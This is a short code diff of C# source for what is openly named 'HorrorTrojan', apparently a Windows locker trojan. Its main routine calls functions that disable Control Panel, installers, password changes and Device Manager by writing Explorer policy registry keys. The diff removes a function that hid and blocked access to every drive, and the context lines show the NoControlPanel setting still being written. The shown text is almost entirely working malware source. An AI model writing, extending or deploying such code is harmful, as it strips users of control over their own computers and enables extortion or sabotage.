@@ -19,7 +19,6 @@ namespace HorrorTrojan
             
             // ===== ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ =====
             DisableControlPanel();
-            DisableDrives();
             DisableInstallers();
             DisablePasswordChange();
             DisableDeviceManager();
@@ -110,15 +109,6 @@ namespace HorrorTrojan
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                 key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
-        }
-        
-        private static void DisableDrives()
-        {
-            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-            {
-                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
-                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
-            }
         }
         
         private static void DisableInstallers()
